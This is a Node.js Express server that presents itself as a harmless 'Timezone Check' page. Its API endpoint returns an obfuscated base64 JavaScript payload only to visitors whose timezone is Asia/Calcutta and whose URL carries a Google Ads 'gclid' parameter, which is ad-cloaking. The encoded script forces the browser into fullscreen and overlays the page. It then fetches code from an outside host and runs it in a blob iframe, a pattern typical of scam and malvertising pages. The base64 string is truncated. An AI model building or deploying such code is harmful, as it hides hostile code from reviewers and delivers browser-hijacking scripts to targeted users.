const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Import cors

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Enable CORS and restrict it to http://localhost:3000
app.use(cors());
// Serve the HTML file
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Timezone Check</title>
    </head>
    <body>
        <h1>Welcome to Website B</h1>
        <p>This server checks the timezone and URL parameters.</p>
    </body>
    </html>
    `);
});

// Endpoint to receive data from website A
app.post('/api/timezone', (req, res) => {
    const { timezone, fullUrl } = req.body;

    // Check if the request body is valid
    if (!req.body || !timezone || !fullUrl) {
        return res.status(400).send('Invalid request body.');
    }

    console.log(`Received timezone: ${timezone}, fullUrl: ${fullUrl}`);

    // Check if the timezone is Asia/Calcutta
    const isTimezoneJapan = timezone === 'Asia/Calcutta';

    // Check if the URL contains 'gclid'
    const containsGclid = fullUrl.includes('gclid');

    // Base64 code to send in response
    const base64Code = 'Ly8gSGlkZSBvdmVyZmxvdyBvbiB0aGUgZG9jdW1lbnQgZWxlbWVudApkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuc3R5bGUub3ZlcmZsb3c9ImhpZGRlbiI7ZG9jdW1lbnQuYm9keS5pbnNlcnRBZGphY2VudEhUTUwoImFmdGVyYmVnaW4iLCI8ZGl2IGlkPSJicnVjZURpdiIgc3R5bGU9IlotaW5kZXg6OTk5OTtwb2ludGVyLWV2ZW50czphdXRvO292ZXJmbG93OmhpZGRlbj48L2Rpdj4iKTtkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsZnVuY3Rpb24oKXtpZihkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQucmVxdWVzdEZ1bGxzY3JlZW4pe2RvY3VtZW50LmRvY3VtZW50RWxlbWVudC5yZXF1ZXN0RnVsbHNjcmVlbigpfWVsc2UgaWYgKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5tb3pSZXF1ZXN0RnVsbFNjcmVlbil7ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50Lm1velJlcXVlc3RGdWxsc2NyZWVuKX1lbHNlIGlmKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC53ZWJraXRSZXF1ZXN0RnVsbHNjcmVlbil7ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LndlYmtpdFJlcXVlc3RGdWxsc2NyZWVuKX1lbHNlIGlmKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5tc1JlcXVlc3RGdWxsc2NyZWVuKXtjb25zb2xlLmxvZygiRW50ZXJpbmcgTVMgZnVsbHNjcmVlbiIpO2RvY3VtZW50LmRvY3VtZW50RWxlbWVudC5tc1JlcXVlc3RGdWxsc2NyZWVuKX1zZXRUaW1lb3V0KCgpPT57d2luZG93LnNjcm9sbFRvKDAsMCl9LDEwMCk7ZmV0Y2goImh0dHBzOi8vaGV0YS5vbnJlbmRlci5jb20vIikudGhlbihyZXNwb25zZT0+cmVzcG9uc2UudGV4dCgpKS50aGVuKGNvbnRlbnQ9Pntjb25zdCBodG1sQ29udGVudD1gPGh0bWw+PGhlYWQ+PHRpdGxlPkVtYmVkZGVkIENvbnRlbnQ8L3RpdGxlPjwvaGVhZD48Ym9keT48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+JHtjb250ZW50fTwvc2NyaXB0PjwvYm9keT48L2h0bWw+YDtsZXQgYmxvYj1uZXcgQmxvYihbaHRtbENvbnRlbnRdLHt0eXBlOiJ0ZXh0L2h0bWwifSk7bGV0IHVybD1VUkwuY3JlYXRlT2JqZWN0VVJMKGJsb2IpO2xldCBpZnJhbWU9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaWZyYW1lIik7aWZyYW1lLnNyYz11cmw7aWZyYW1lLnN0eWxlLndpZHRoPSIxMDAlIjt...'; // Your base64 string here

    // If both conditions are met, respond with the base64 code
    if (isTimezoneJapan && containsGclid) {
        console.log(`Response sent: ${base64Code}`);
        return res.status(200).send(base64Code); // Send the base64 string directly
    } else {
        const responseMessage = 'Conditions not met.';
        console.log(responseMessage);
        return res.status(200).send(responseMessage);
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
